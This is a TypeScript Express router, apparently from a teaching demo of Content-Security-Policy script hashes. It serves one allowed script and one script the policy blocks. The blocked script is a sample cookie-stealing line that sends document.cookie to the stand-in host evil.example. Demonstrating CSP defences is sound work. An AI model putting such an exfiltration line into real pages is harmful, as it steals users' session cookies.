import type { Response } from 'express';
import express from 'express';
import { csp, formatDirectives, hashScript } from '../../csp';
import { render } from '../../render';

const router = express.Router();

const HASH_SCRIPT_CONTENT = `markScriptRan();`;
const DIFFERENT_SCRIPT_CONTENT = `fetch('https://evil.example/steal?c=' + document.cookie)`;
const SCRIPT_HASH = hashScript(HASH_SCRIPT_CONTENT);
const DIFFERENT_SCRIPT_HASH = hashScript(DIFFERENT_SCRIPT_CONTENT);

const HASH_DIRECTIVES = { 'script-src': `'self' '${SCRIPT_HASH}'` };
const CSP_HEADER = csp(HASH_DIRECTIVES);
const CSP_DISPLAY = formatDirectives(HASH_DIRECTIVES);
const EXPLANATION = `CSP is active on both pages. The script only runs if its content hashes to the value in the policy — any change, even a single character, produces a different hash and gets blocked. The policy allows: <code>${HASH_SCRIPT_CONTENT}</code> → <code>${SCRIPT_HASH}</code>.`;

function hashHandler(withHash: boolean) {
  return (_req: unknown, res: Response) => {
    res.setHeader('Content-Security-Policy', CSP_HEADER);
    render(res, 'examples/hash', {
      title: 'script-src hash',
      withHash,
      scriptHash: SCRIPT_HASH,
      differentScriptHash: DIFFERENT_SCRIPT_HASH,
      activeScript: withHash ? HASH_SCRIPT_CONTENT : DIFFERENT_SCRIPT_CONTENT,
      cspDisplay: CSP_DISPLAY,
      explanation: EXPLANATION,
    });
  };
}

router.get('/hash', hashHandler(true));
router.get('/no-hash', hashHandler(false));

export default router;
